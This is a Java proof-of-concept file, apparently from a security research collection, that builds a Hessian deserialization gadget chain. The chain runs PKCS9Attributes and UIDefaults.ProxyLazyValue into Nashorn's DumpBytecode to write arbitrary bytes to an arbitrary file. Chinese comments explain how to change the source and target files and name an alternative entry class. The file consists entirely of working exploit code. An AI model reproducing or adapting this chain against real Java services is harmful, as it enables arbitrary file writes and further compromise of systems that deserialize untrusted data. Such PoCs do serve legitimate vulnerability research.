package com.javasec.pocs.hessian;

import com.javasec.utils.SerializeUtils;
import jdk.nashorn.internal.runtime.ScriptEnvironment;
import jdk.nashorn.internal.runtime.logging.DebugLogger;
import sun.misc.Unsafe;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;

import javax.swing.*;

public class HessianProxyLVFileWrite2 {
    public static void main(String[] args) throws Exception {
        //Pkcs9可以换成MimeTypeParameterList
        PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        //去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt
        Unsafe unsafe = SerializeUtils.getUnsafe();
        Object scriptenv = unsafe.allocateInstance(ScriptEnvironment.class);
        Object debug = unsafe.allocateInstance(DebugLogger.class);
        SerializeUtils.setFieldValue(scriptenv,"_dest_dir","E:\\");
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new UIDefaults.ProxyLazyValue("jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode", new Object[]{
                scriptenv,debug,SerializeUtils.getFileBytes("E:\\1.txt"),"pwned2"
        }));
        SerializeUtils.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(pkcs9Attributes));
    }
}
